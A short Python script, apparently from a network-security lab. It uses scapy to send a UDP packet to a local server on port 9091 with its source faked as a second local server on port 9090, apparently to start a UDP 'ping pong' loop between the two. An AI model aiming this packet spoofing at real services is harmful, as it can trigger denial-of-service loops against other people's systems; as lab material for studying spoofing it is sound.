#!/usr/bin/env python3
from scapy.all import *

# A 서버는 127.0.0.1:9090
# B 서버는 127.0.0.1:9091
# B에게 보내지만, 출발지를 A처럼 위조

ip = IP(src="127.0.0.1", dst="127.0.0.1")
udp = UDP(sport=9090, dport=9091)  # src는 A, dst는 B
data = "Let the Ping Pong game start!\n"
pkt = ip / udp / data
send(pkt, verbose=1)